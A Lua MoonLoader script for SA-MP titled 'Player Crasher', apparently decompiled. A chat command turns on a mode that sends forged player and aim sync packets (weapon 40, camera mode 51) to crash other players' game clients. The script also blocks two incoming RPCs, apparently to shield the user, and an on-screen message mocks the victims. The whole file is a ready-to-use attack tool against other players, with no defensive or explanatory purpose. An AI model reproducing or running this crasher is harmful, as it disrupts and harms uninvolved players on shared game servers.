﻿script_name("Player Crasher")
script_author("Mai_huz")
require("moonloader")

local slot0 = require("lib.samp.events")
local slot1 = false
local slot2 = false
local slot3 = false
local slot4 = false
local slot5 = false
local slot6 = false

function main()
	while not isSampAvailable() do
		wait(0)
	end

	sampRegisterChatCommand("fcrash", slot3)

	while true do
		wait(0)
	end
end

function slot3()
	slot1 = not slot1

	if slot5 then
		sampAddChatMessage("{ff0000}[maihuz crash]: {ffff00}On-Foot Crasher Now Is OFF", -1)

		slot5 = false
	else
		sampAddChatMessage("{ff0000}[maihuz crash]: {ffff00}On-Foot Crasher Now Is ON", -1)

		slot5 = true
	end
end

function onReceiveRpc(arg_3_0, arg_3_1)
	if slot5 and arg_3_0 == 13 then
		return false
	end

	if slot5 and arg_3_0 == 87 then
		return false
	end
end

function slot0.onSendPlayerSync(arg_4_0)
	if slot1 then
		slot2 = not slot2
		samp_create_sync_data("aim").camMode = 0
	end

	if slot2 then
		sendSpectator(slot4)
	end

	if slot1 then
		slot6 = not slot6

		if slot6 then
			local var_4_0 = samp_create_sync_data("player")

			var_4_0.weapon = 40
			var_4_0.keysData = 128

			var_4_0.send()
			printStringNow("~r~Sabog ang mga bobong tao", 500)

			return false
		end
	end
end

function sendSpectator(arg_5_0)
	if slot2 then
		local var_5_0 = samp_create_sync_data("aim")

		var_5_0.camMode = 51

		var_5_0.send()
	end
end

function samp_create_sync_data(arg_6_0, arg_6_1)
	local var_6_0 = require("ffi")
	local var_6_1 = require("sampfuncs")
	local var_6_2 = require("samp.raknet")

	arg_6_1 = arg_6_1 or true

	local var_6_3 = ({
		player = {
			"PlayerSyncData",
			var_6_2.PACKET.PLAYER_SYNC,
			sampStorePlayerOnfootData
		},
		vehicle = {
			"VehicleSyncData",
			var_6_2.PACKET.VEHICLE_SYNC,
			sampStorePlayerIncarData
		},
		passenger = {
			"PassengerSyncData",
			var_6_2.PACKET.PASSENGER_SYNC,
			sampStorePlayerPassengerData
		},
		aim = {
			"AimSyncData",
			var_6_2.PACKET.AIM_SYNC,
			sampStorePlayerAimData
		},
		trailer = {
			"TrailerSyncData",
			var_6_2.PACKET.TRAILER_SYNC,
			sampStorePlayerTrailerData
		},
		unoccupied = {
			"UnoccupiedSyncData",
			var_6_2.PACKET.UNOCCUPIED_SYNC
		},
		bullet = {
			"BulletSyncData",
			var_6_2.PACKET.BULLET_SYNC
		},
		spectator = {
			"SpectatorSyncData",
			var_6_2.PACKET.SPECTATOR_SYNC
		}
	})[arg_6_0]
	local var_6_4 = "struct " .. var_6_3[1]
	local var_6_5 = var_6_0.new(var_6_4, {})
	local var_6_6 = tonumber(var_6_0.cast("uintptr_t", var_6_0.new(var_6_4 .. "*", var_6_5)))

	if arg_6_1 then
		local var_6_7 = var_6_3[3]

		if var_6_7 then
			local var_6_8
			local var_6_9

			if arg_6_1 == true then
				local var_6_10

				var_6_10, var_6_9 = sampGetPlayerIdByCharHandle(PLAYER_PED)
			else
				var_6_9 = tonumber(arg_6_1)
			end

			var_6_7(var_6_9, var_6_6)
		end
	end

	local function var_6_11()
		local var_7_0 = raknetNewBitStream()

		raknetBitStreamWriteInt8(var_7_0, var_6_3[2])
		raknetBitStreamWriteBuffer(var_7_0, var_6_6, var_6_0.sizeof(var_6_5))
		raknetSendBitStreamEx(var_7_0, var_6_1.HIGH_PRIORITY, var_6_1.UNRELIABLE_SEQUENCED, 1)
		raknetDeleteBitStream(var_7_0)
	end

	local var_6_12 = {
		__index = function(arg_8_0, arg_8_1)
			return var_6_5[arg_8_1]
		end,
		__newindex = function(arg_9_0, arg_9_1, arg_9_2)
			var_6_5[arg_9_1] = arg_9_2
		end
	}

	return setmetatable({
		send = var_6_11
	}, var_6_12)
end

function emul_rpc(arg_10_0, arg_10_1)
	local var_10_0 = require("samp.events.bitstream_io")
	local var_10_1 = require("samp.events.handlers")
	local var_10_2 = require("samp.events.extra_types")
	local var_10_3 = {
		onInitGame = {
			139
		},
		onPlayerJoin = {
			"int16",
			"int32",
			"bool8",
			"string8",
			137
		},
		onPlayerQuit = {
			"int16",
			"int8",
			138
		},
		onRequestClassResponse = {
			"bool8",
			"int8",
			"int32",
			"int8",
			"vector3d",
			"float",
			"Int32Array3",
			"Int32Array3",
			128
		},
		onRequestSpawnResponse = {
			"bool8",
			129
		},
		onSetPlayerName = {
			"int16",
			"string8",
			"bool8",
			11
		},
		onSetPlayerPos = {
			"vector3d",
			12
		},
		onSetPlayerPosFindZ = {
			"vector3d",
			13
		},
		onSetPlayerHealth = {
			"float",
			14
		},
		onTogglePlayerControllable = {
			"bool8",
			15
		},
		onPlaySound = {
			"int32",
			"vector3d",
			16
		},
		onSetWorldBounds = {
			"float",
			"float",
			"float",
			"float",
			17
		},
		onGivePlayerMoney = {
			"int32",
			18
		},
		onSetPlayerFacingAngle = {
			"float",
			19
		},
		onGivePlayerWeapon = {
			"int32",
			"int32",
			22
		},
		onSetPlayerTime = {
			"int8",
			"int8",
			29
		},
		onSetToggleClock = {
			"bool8",
			30
		},
		onPlayerStreamIn = {
			"int16",
			"int8",
			"int32",
			"vector3d",
			"float",
			"int32",
			"int8",
			32
		},
		onSetShopName = {
			"string256",
			33
		},
		onSetPlayerSkillLevel = {
			"int16",
			"int32",
			"int16",
			34
		},
		onSetPlayerDrunk = {
			"int32",
			35
		},
		onCreate3DText = {
			"int16",
			"int32",
			"vector3d",
			"float",
			"bool8",
			"int16",
			"int16",
			"encodedString4096",
			36
		},
		onSetRaceCheckpoint = {
			"int8",
			"vector3d",
			"vector3d",
			"float",
			38
		},
		onPlayAudioStream = {
			"string8",
			"vector3d",
			"float",
			"bool8",
			41
		},
		onRemoveBuilding = {
			"int32",
			"vector3d",
			"float",
			43
		},
		onCreateObject = {
			44
		},
		onSetObjectPosition = {
			"int16",
			"vector3d",
			45
		},
		onSetObjectRotation = {
			"int16",
			"vector3d",
			46
		},
		onDestroyObject = {
			"int16",
			47
		},
		onPlayerDeathNotification = {
			"int16",
			"int16",
			"int8",
			55
		},
		onSetMapIcon = {
			"int8",
			"vector3d",
			"int8",
			"int32",
			"int8",
			56
		},
		onRemoveVehicleComponent = {
			"int16",
			"int16",
			57
		},
		onRemove3DTextLabel = {
			"int16",
			58
		},
		onPlayerChatBubble = {
			"int16",
			"int32",
			"float",
			"int32",
			"string8",
			59
		},
		onUpdateGlobalTimer = {
			"int32",
			60
		},
		onShowDialog = {
			"int16",
			"int8",
			"string8",
			"string8",
			"string8",
			"encodedString4096",
			61
		},
		onDestroyPickup = {
			"int32",
			63
		},
		onLinkVehicleToInterior = {
			"int16",
			"int8",
			65
		},
		onSetPlayerArmour = {
			"float",
			66
		},
		onSetPlayerArmedWeapon = {
			"int32",
			67
		},
		onSetSpawnInfo = {
			"int8",
			"int32",
			"int8",
			"vector3d",
			"float",
			"Int32Array3",
			"Int32Array3",
			68
		},
		onSetPlayerTeam = {
			"int16",
			"int8",
			69
		},
		onPutPlayerInVehicle = {
			"int16",
			"int8",
			70
		},
		onSetPlayerColor = {
			"int16",
			"int32",
			72
		},
		onDisplayGameText = {
			"int32",
			"int32",
			"string32",
			73
		},
		onAttachObjectToPlayer = {
			"int16",
			"int16",
			"vector3d",
			"vector3d",
			75
		},
		onInitMenu = {
			76
		},
		onShowMenu = {
			"int8",
			77
		},
		onHideMenu = {
			"int8",
			78
		},
		onCreateExplosion = {
			"vector3d",
			"int32",
			"float",
			79
		},
		onShowPlayerNameTag = {
			"int16",
			"bool8",
			80
		},
		onAttachCameraToObject = {
			"int16",
			81
		},
		onInterpolateCamera = {
			"bool",
			"vector3d",
			"vector3d",
			"int32",
			"int8",
			82
		},
		onGangZoneStopFlash = {
			"int16",
			85
		},
		onApplyPlayerAnimation = {
			"int16",
			"string8",
			"string8",
			"bool",
			"bool",
			"bool",
			"bool",
			"int32",
			86
		},
		onClearPlayerAnimation = {
			"int16",
			87
		},
		onSetPlayerSpecialAction = {
			"int8",
			88
		},
		onSetPlayerFightingStyle = {
			"int16",
			"int8",
			89
		},
		onSetPlayerVelocity = {
			"vector3d",
			90
		},
		onSetVehicleVelocity = {
			"bool8",
			"vector3d",
			91
		},
		onServerMessage = {
			"int32",
			"string32",
			93
		},
		onSetWorldTime = {
			"int8",
			94
		},
		onCreatePickup = {
			"int32",
			"int32",
			"int32",
			"vector3d",
			95
		},
		onMoveObject = {
			"int16",
			"vector3d",
			"vector3d",
			"float",
			"vector3d",
			99
		},
		onEnableStuntBonus = {
			"bool",
			104
		},
		onTextDrawSetString = {
			"int16",
			"string16",
			105
		},
		onSetCheckpoint = {
			"vector3d",
			"float",
			107
		},
		onCreateGangZone = {
			"int16",
			"vector2d",
			"vector2d",
			"int32",
			108
		},
		onPlayCrimeReport = {
			"int16",
			"int32",
			"int32",
			"int32",
			"int32",
			"vector3d",
			112
		},
		onGangZoneDestroy = {
			"int16",
			120
		},
		onGangZoneFlash = {
			"int16",
			"int32",
			121
		},
		onStopObject = {
			"int16",
			122
		},
		onSetVehicleNumberPlate = {
			"int16",
			"string8",
			123
		},
		onTogglePlayerSpectating = {
			"bool32",
			124
		},
		onSpectatePlayer = {
			"int16",
			"int8",
			126
		},
		onSpectateVehicle = {
			"int16",
			"int8",
			127
		},
		onShowTextDraw = {
			134
		},
		onSetPlayerWantedLevel = {
			"int8",
			133
		},
		onTextDrawHide = {
			"int16",
			135
		},
		onRemoveMapIcon = {
			"int8",
			144
		},
		onSetWeaponAmmo = {
			"int8",
			"int16",
			145
		},
		onSetGravity = {
			"float",
			146
		},
		onSetVehicleHealth = {
			"int16",
			"float",
			147
		},
		onAttachTrailerToVehicle = {
			"int16",
			"int16",
			148
		},
		onDetachTrailerFromVehicle = {
			"int16",
			149
		},
		onSetWeather = {
			"int8",
			152
		},
		onSetPlayerSkin = {
			"int32",
			"int32",
			153
		},
		onSetInterior = {
			"int8",
			156
		},
		onSetCameraPosition = {
			"vector3d",
			157
		},
		onSetCameraLookAt = {
			"vector3d",
			"int8",
			158
		},
		onSetVehiclePosition = {
			"int16",
			"vector3d",
			159
		},
		onSetVehicleAngle = {
			"int16",
			"float",
			160
		},
		onSetVehicleParams = {
			"int16",
			"int16",
			"bool8",
			161
		},
		onChatMessage = {
			"int16",
			"string8",
			101
		},
		onConnectionRejected = {
			"int8",
			130
		},
		onPlayerStreamOut = {
			"int16",
			163
		},
		onVehicleStreamIn = {
			164
		},
		onVehicleStreamOut = {
			"int16",
			165
		},
		onPlayerDeath = {
			"int16",
			166
		},
		onPlayerEnterVehicle = {
			"int16",
			"int16",
			"bool8",
			26
		},
		onUpdateScoresAndPings = {
			"PlayerScorePingMap",
			155
		},
		onSetObjectMaterial = {
			84
		},
		onSetObjectMaterialText = {
			84
		},
		onSetVehicleParamsEx = {
			"int16",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			24
		},
		onSetPlayerAttachedObject = {
			"int16",
			"int32",
			"bool",
			"int32",
			"int32",
			"vector3d",
			"vector3d",
			"vector3d",
			"int32",
			"int32",
			113
		}
	}
	local var_10_4 = {
		onShowTextDraw = true,
		onSetObjectMaterialText = true,
		onVehicleStreamIn = true,
		onSetObjectMaterial = true,
		onInitMenu = true,
		onInitGame = true,
		onCreateObject = true
	}
	local var_10_5 = {
		Int32Array3 = true,
		PlayerScorePingMap = true
	}
	local var_10_6 = var_10_3[arg_10_0]

	if var_10_6 then
		local var_10_7 = raknetNewBitStream()

		if not var_10_4[arg_10_0] then
			local var_10_8 = #var_10_6 - 1

			if var_10_8 > 0 then
				for iter_10_0 = 1, var_10_8 do
					local var_10_9 = var_10_6[iter_10_0]

					if var_10_5[var_10_9] then
						var_10_2[var_10_9].write(var_10_7, arg_10_1[iter_10_0])
					else
						var_10_0[var_10_9].write(var_10_7, arg_10_1[iter_10_0])
					end
				end
			end
		elseif arg_10_0 == "onInitGame" then
			var_10_1.on_init_game_writer(var_10_7, arg_10_1)
		elseif arg_10_0 == "onCreateObject" then
			var_10_1.on_create_object_writer(var_10_7, arg_10_1)
		elseif arg_10_0 == "onInitMenu" then
			var_10_1.on_init_menu_writer(var_10_7, arg_10_1)
		elseif arg_10_0 == "onShowTextDraw" then
			var_10_1.on_show_textdraw_writer(var_10_7, arg_10_1)
		elseif arg_10_0 == "onVehicleStreamIn" then
			var_10_1.on_vehicle_stream_in_writer(var_10_7, arg_10_1)
		elseif arg_10_0 == "onSetObjectMaterial" then
			var_10_1.on_set_object_material_writer(var_10_7, arg_10_1, 1)
		elseif arg_10_0 == "onSetObjectMaterialText" then
			var_10_1.on_set_object_material_writer(var_10_7, arg_10_1, 2)
		end

		raknetEmulRpcReceiveBitStream(var_10_6[#var_10_6], var_10_7)
		raknetDeleteBitStream(var_10_7)
	end
end
